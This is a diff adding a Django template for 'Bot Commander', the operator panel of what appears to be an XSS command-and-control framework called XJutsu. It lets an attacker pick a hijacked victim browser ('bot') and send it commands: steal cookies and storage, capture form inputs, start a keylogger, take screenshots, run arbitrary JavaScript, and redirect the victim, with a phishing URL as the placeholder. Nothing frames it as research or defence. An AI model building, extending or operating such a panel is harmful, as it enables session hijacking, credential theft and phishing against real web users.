@@ -1,0 +1,325 @@
+{% extends 'hunter/base.html' %}
+
+{% block title %}Bot Commander - XJutsu v5{% endblock %}
+
+{% block content %}
+<div class="space-y-6">
+    <!-- Header -->
+    <div>
+        <h1 class="text-3xl font-bold">
+            <i class="fas fa-terminal text-primary mr-2"></i>Bot Commander
+        </h1>
+        <p class="text-gray-500 mt-1">Send commands to connected XSS bots</p>
+    </div>
+    
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <!-- Command Panel -->
+        <div class="lg:col-span-2 space-y-6">
+            <!-- Send Command -->
+            <div class="card rounded-xl p-6">
+                <h2 class="text-xl font-bold mb-4">
+                    <i class="fas fa-paper-plane text-green-500 mr-2"></i>Send Command
+                </h2>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-sm text-gray-500 mb-2">Bot ID</label>
+                        <input type="text" id="botId" placeholder="Enter bot ID or select from list"
+                            class="w-full px-4 py-2 bg-dark-900 border border-gray-700 rounded-lg focus:outline-none focus:border-primary font-mono">
+                    </div>
+                    
+                    <div>
+                        <label class="block text-sm text-gray-500 mb-2">Command</label>
+                        <select id="commandSelect" onchange="updateCommandArgs()" 
+                            class="w-full px-4 py-2 bg-dark-900 border border-gray-700 rounded-lg focus:outline-none focus:border-primary">
+                            <option value="">Select a command...</option>
+                            {% for cmd, info in commands.items %}
+                            <option value="{{ cmd }}" data-args="{{ info.args|join:',' }}" data-example="{{ info.example }}">
+                                {{ cmd }} - {{ info.description }}
+                            </option>
+                            {% endfor %}
+                        </select>
+                    </div>
+                    
+                    <div id="argsContainer" class="hidden">
+                        <label class="block text-sm text-gray-500 mb-2">Arguments</label>
+                        <textarea id="commandArgs" rows="3" placeholder="Enter arguments..."
+                            class="w-full px-4 py-2 bg-dark-900 border border-gray-700 rounded-lg focus:outline-none focus:border-primary font-mono"></textarea>
+                        <p class="text-xs text-gray-600 mt-1">Example: <span id="argsExample"></span></p>
+                    </div>
+                    
+                    <button onclick="sendCommand()" class="btn-primary w-full py-3 rounded-lg font-semibold">
+                        <i class="fas fa-bolt mr-2"></i>Execute Command
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Quick Actions -->
+            <div class="card rounded-xl p-6">
+                <h2 class="text-xl font-bold mb-4">
+                    <i class="fas fa-zap text-yellow-500 mr-2"></i>Quick Actions
+                </h2>
+                
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+                    <button onclick="quickCommand('screenshot')" class="p-4 bg-dark-900 rounded-lg hover:bg-dark-700 transition text-center">
+                        <i class="fas fa-camera text-2xl text-blue-500 mb-2"></i>
+                        <p class="text-sm">Screenshot</p>
+                    </button>
+                    <button onclick="quickCommand('get_cookies')" class="p-4 bg-dark-900 rounded-lg hover:bg-dark-700 transition text-center">
+                        <i class="fas fa-cookie text-2xl text-yellow-500 mb-2"></i>
+                        <p class="text-sm">Get Cookies</p>
+                    </button>
+                    <button onclick="quickCommand('get_storage')" class="p-4 bg-dark-900 rounded-lg hover:bg-dark-700 transition text-center">
+                        <i class="fas fa-database text-2xl text-purple-500 mb-2"></i>
+                        <p class="text-sm">Get Storage</p>
+                    </button>
+                    <button onclick="quickCommand('exfil_input')" class="p-4 bg-dark-900 rounded-lg hover:bg-dark-700 transition text-center">
+                        <i class="fas fa-keyboard text-2xl text-green-500 mb-2"></i>
+                        <p class="text-sm">Get Inputs</p>
+                    </button>
+                    <button onclick="quickCommand('keylogger_start')" class="p-4 bg-dark-900 rounded-lg hover:bg-dark-700 transition text-center">
+                        <i class="fas fa-key text-2xl text-red-500 mb-2"></i>
+                        <p class="text-sm">Start Keylog</p>
+                    </button>
+                    <button onclick="quickCommand('keylogger_stop')" class="p-4 bg-dark-900 rounded-lg hover:bg-dark-700 transition text-center">
+                        <i class="fas fa-stop text-2xl text-red-400 mb-2"></i>
+                        <p class="text-sm">Stop Keylog</p>
+                    </button>
+                    <button onclick="showEvalModal()" class="p-4 bg-dark-900 rounded-lg hover:bg-dark-700 transition text-center">
+                        <i class="fas fa-code text-2xl text-pink-500 mb-2"></i>
+                        <p class="text-sm">Custom JS</p>
+                    </button>
+                    <button onclick="showRedirectModal()" class="p-4 bg-dark-900 rounded-lg hover:bg-dark-700 transition text-center">
+                        <i class="fas fa-external-link-alt text-2xl text-cyan-500 mb-2"></i>
+                        <p class="text-sm">Redirect</p>
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Command Log -->
+            <div class="card rounded-xl p-6">
+                <h2 class="text-xl font-bold mb-4">
+                    <i class="fas fa-history text-gray-500 mr-2"></i>Command Log
+                </h2>
+                <div id="commandLog" class="bg-dark-900 rounded-lg p-4 h-64 overflow-y-auto font-mono text-sm">
+                    <p class="text-gray-600">Commands will appear here...</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Sidebar -->
+        <div class="space-y-6">
+            <!-- Active Bots -->
+            <div class="card rounded-xl p-6">
+                <h2 class="text-lg font-bold mb-4">
+                    <i class="fas fa-robot text-primary mr-2"></i>Recent Bots
+                </h2>
+                <div class="space-y-2 max-h-64 overflow-y-auto">
+                    {% for bot in recent_bots %}
+                    <button onclick="selectBot('{{ bot.bot_id }}')" 
+                        class="w-full text-left px-3 py-2 bg-dark-900 rounded-lg hover:bg-dark-700 transition">
+                        <code class="text-sm text-primary">{{ bot.bot_id }}</code>
+                    </button>
+                    {% empty %}
+                    <p class="text-gray-500 text-sm">No recent bots</p>
+                    {% endfor %}
+                </div>
+            </div>
+            
+            <!-- Available Commands -->
+            <div class="card rounded-xl p-6">
+                <h2 class="text-lg font-bold mb-4">
+                    <i class="fas fa-list text-secondary mr-2"></i>Available Commands
+                </h2>
+                <div class="space-y-2 max-h-96 overflow-y-auto">
+                    {% for cmd, info in commands.items %}
+                    <div class="text-sm">
+                        <code class="text-primary">{{ cmd }}</code>
+                        <p class="text-gray-500 text-xs">{{ info.description }}</p>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Eval Modal -->
+<div id="evalModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50">
+    <div class="card rounded-xl p-6 w-full max-w-2xl mx-4">
+        <h3 class="text-xl font-bold mb-4">Execute Custom JavaScript</h3>
+        <textarea id="evalCode" rows="10" placeholder="// Enter JavaScript code to execute..."
+            class="w-full px-4 py-2 bg-dark-900 border border-gray-700 rounded-lg focus:outline-none focus:border-primary font-mono text-sm"></textarea>
+        <div class="flex justify-end space-x-4 mt-4">
+            <button onclick="closeModals()" class="px-4 py-2 text-gray-400 hover:text-white">Cancel</button>
+            <button onclick="executeEval()" class="btn-primary px-6 py-2 rounded-lg">Execute</button>
+        </div>
+    </div>
+</div>
+
+<!-- Redirect Modal -->
+<div id="redirectModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50">
+    <div class="card rounded-xl p-6 w-full max-w-md mx-4">
+        <h3 class="text-xl font-bold mb-4">Redirect Browser</h3>
+        <input type="url" id="redirectUrl" placeholder="https://example.com/phishing"
+            class="w-full px-4 py-2 bg-dark-900 border border-gray-700 rounded-lg focus:outline-none focus:border-primary">
+        <div class="flex justify-end space-x-4 mt-4">
+            <button onclick="closeModals()" class="px-4 py-2 text-gray-400 hover:text-white">Cancel</button>
+            <button onclick="executeRedirect()" class="btn-primary px-6 py-2 rounded-lg">Redirect</button>
+        </div>
+    </div>
+</div>
+
+<script>
+function selectBot(botId) {
+    document.getElementById('botId').value = botId;
+    logMessage(`Selected bot: ${botId}`, 'info');
+}
+
+function updateCommandArgs() {
+    const select = document.getElementById('commandSelect');
+    const option = select.options[select.selectedIndex];
+    const argsContainer = document.getElementById('argsContainer');
+    const argsExample = document.getElementById('argsExample');
+    
+    const args = option.dataset.args;
+    const example = option.dataset.example;
+    
+    if (args) {
+        argsContainer.classList.remove('hidden');
+        argsExample.textContent = example || args;
+    } else {
+        argsContainer.classList.add('hidden');
+    }
+}
+
+async function sendCommand() {
+    const botId = document.getElementById('botId').value;
+    const command = document.getElementById('commandSelect').value;
+    const argsText = document.getElementById('commandArgs').value;
+    
+    if (!botId) {
+        logMessage('Error: Bot ID required', 'error');
+        return;
+    }
+    if (!command) {
+        logMessage('Error: Command required', 'error');
+        return;
+    }
+    
+    // Parse args
+    let args = {};
+    if (argsText) {
+        try {
+            args = JSON.parse(argsText);
+        } catch {
+            // If not JSON, use as single arg based on command
+            if (command === 'eval') args = { code: argsText };
+            else if (command === 'redirect') args = { url: argsText };
+            else if (command === 'collect_page') args = { url: argsText };
+            else args = { value: argsText };
+        }
+    }
+    
+    await executeCommand(botId, command, args);
+}
+
+async function quickCommand(command) {
+    const botId = document.getElementById('botId').value;
+    if (!botId) {
+        logMessage('Error: Select a bot first', 'error');
+        return;
+    }
+    await executeCommand(botId, command, {});
+}
+
+async function executeCommand(botId, command, args) {
+    logMessage(`Sending: ${command} -> ${botId}`, 'info');
+    
+    try {
+        const response = await fetch('{% url "send_bot_command" %}', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': '{{ csrf_token }}'
+            },
+            body: JSON.stringify({ bot_id: botId, command, args })
+        });
+        
+        const data = await response.json();
+        
+        if (data.status === 'success') {
+            logMessage(data.message, 'success');
+        } else {
+            logMessage(data.error || data.message, 'error');
+        }
+    } catch (e) {
+        logMessage(`Error: ${e.message}`, 'error');
+    }
+}
+
+function logMessage(message, type = 'info') {
+    const log = document.getElementById('commandLog');
+    const time = new Date().toLocaleTimeString();
+    const colors = {
+        info: 'text-blue-400',
+        success: 'text-green-400',
+        error: 'text-red-400'
+    };
+    
+    const entry = document.createElement('p');
+    entry.className = colors[type] || 'text-gray-400';
+    entry.textContent = `[${time}] ${message}`;
+    
+    if (log.querySelector('.text-gray-600')) {
+        log.innerHTML = '';
+    }
+    
+    log.appendChild(entry);
+    log.scrollTop = log.scrollHeight;
+}
+
+function showEvalModal() {
+    document.getElementById('evalModal').classList.remove('hidden');
+    document.getElementById('evalModal').classList.add('flex');
+}
+
+function showRedirectModal() {
+    document.getElementById('redirectModal').classList.remove('hidden');
+    document.getElementById('redirectModal').classList.add('flex');
+}
+
+function closeModals() {
+    document.getElementById('evalModal').classList.add('hidden');
+    document.getElementById('evalModal').classList.remove('flex');
+    document.getElementById('redirectModal').classList.add('hidden');
+    document.getElementById('redirectModal').classList.remove('flex');
+}
+
+async function executeEval() {
+    const botId = document.getElementById('botId').value;
+    const code = document.getElementById('evalCode').value;
+    
+    if (!botId) {
+        logMessage('Error: Select a bot first', 'error');
+        return;
+    }
+    
+    await executeCommand(botId, 'eval', { code });
+    closeModals();
+}
+
+async function executeRedirect() {
+    const botId = document.getElementById('botId').value;
+    const url = document.getElementById('redirectUrl').value;
+    
+    if (!botId) {
+        logMessage('Error: Select a bot first', 'error');
+        return;
+    }
+    
+    await executeCommand(botId, 'redirect', { url });
+    closeModals();
+}
+</script>
+{% endblock %}
